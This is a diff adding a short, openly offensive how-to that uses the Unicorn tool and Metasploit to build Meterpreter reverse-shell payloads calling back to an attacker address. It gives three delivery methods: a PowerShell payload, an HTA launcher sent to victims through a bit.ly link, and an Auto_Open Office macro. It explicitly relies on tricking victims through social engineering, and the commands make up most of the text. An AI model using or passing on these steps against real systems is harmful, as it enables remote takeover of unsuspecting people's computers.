@@ -7,3 +7,34 @@ Macro Attack Instruction
 -------------------------------------------------------------------------------------------------------------------
 git clone https://github.com/trustedsec/unicorn.git
 ./unicorn.py
+------------------------------------------------------------------------------------
+Powershell Attak:
+python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 4444
+Now this will give us two files. One is a text file named “powershell_attack.txt” which has the PowerShell code that will be run in the victim’s machine using social engineering 
+and the other is “unicorn.rc” which is a custom Metasploit file that will automatically set all the parameters and start a listener.
+
+set up a listener first. We need to run the Metasploit “unicorn.rc” file using the following command:
+
+msfconsole -r unicorn.rc
+---------------------------------------------------------------------------------------------------------------
+HTA Attack Instructions
+For our next attack, we will be using an HTA payload.
+
+python unicorn.py windows/meterpreter/reverse_https 192.168.1.109 4455 hta
+
+Now convert your IP in bit.ly URL form and send to the victim and then wait for the user to click on the “launcher.hta” file which could be done using social engineering easily.
+msfconsole -r unicorn.rc
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Macro Attack Instructions
+python unicorn.py windows/meterpreter/reverse_https 192.168.1.109 443 macro
+
+To enable developer mode there are various methods depending upon your version of MS office.
+
+As for a generic approach, let’s say you enabled it like:
+
+File->properties->ribbons->developer mode
+As for the attack, go to developer->macros and create a new macro named “Auto_Open”
+
+Simply paste the contents from “powershell_attack.txt” to this xlsx module and save it.
+
+msfconsole -r unicorn.rc
